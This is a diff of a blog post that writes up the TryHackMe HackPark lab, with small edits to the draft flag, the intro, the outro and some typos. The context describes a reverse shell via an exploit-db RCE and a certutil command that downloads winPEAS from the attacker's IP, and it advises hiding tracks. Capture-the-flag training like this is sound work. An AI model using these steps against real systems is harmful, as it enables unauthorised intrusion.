@@ -1,12 +1,12 @@
 ---
 title: "THM - HackPark without MetaSploit"
 date: 2021-02-21
-draft: true
 categories: ["hacking", "write-ups"]
 tags: [THM]
 featuredImage: "/images/2021/02/HackPark_Logo.png"
 ---
 ## Intro
+New box, new tools, looks like we are going to crack credentials! Let's do it right now.
 
 ## Target
 [THM - HackPark](https://tryhackme.com/room/hackpark)
@@ -531,7 +531,7 @@ It is time to play with our Authenticated RCEs!
 ### Getting initial shell
 This [RCE](https://www.exploit-db.com/exploits/46353) seems to apply to our target and is well written, it explains step by step how to exploit it :
 
-0. Setup `netcat` listner on our attacking box ;
+0. Setup `netcat` listener on our attacking box ;
 1. We create a file called `PostView.ascx` and modify it with the IP and port of our attacking box ;
 2. Upload it ;
 3. Visit URL to trigger to remote shell.
@@ -540,7 +540,7 @@ And it worked :
 
 ![HackPark Initial Shell](/images/2021/02/HackPark_Initial_Shell.png)
 
-Unfortunately, we are  not SYSTEM. Like we guessed during recon, we'll have to elevate our priv.
+Unfortunately, we are not `SYSTEM`. Like we guessed during recon, we'll have to elevate our priv.
 
 ### PrivEsc
 
@@ -551,12 +551,12 @@ certutil -urlcache -f http://10.11.27.240/winPEAS.bat winPEAS.bat
 ```
 NB : make sure to use a writable folder, such as: `C:\Users\Public`.
 
-and we run it with :
+We run it with :
 
 ```text
 winPEAS.bat log
 ```
-the `log` switch will save output to a log file and display it. Since we are training, there is no problem in saving the log in the remote machine. However, on a real assessment where you could have to hide you tracks, it might be better to simply print the log and copy it manually in order to save it outside the target. In any case, like with scanning tools, it is preferred to run the tool only once and save output. It will make you "quieter", which is want you probably want.
+The `log` switch will save output to a log file and display it. Since we are training, there is no problem in saving the log in the remote machine. However, on a real assessment where you could have to hide you tracks, it might be better to simply print the log and copy it manually in order to save it outside the target. In any case, like with scanning tools, it is preferred to run the tool only once and save output. It will make you "quieter", which is want you probably want.
 
 WinPEAS will reveal some `Administrator credentials` :
 
@@ -574,5 +574,5 @@ Then root:
 
 ![HackPark Root Flag](/images/2021/02/HackPark_Root_Flag.png)
 
-
 ## Outro
+In this box, we learned how to use `Hydra` for credentials cracking and practiced what we've already been doing before to escalate privileges. A cool little box!
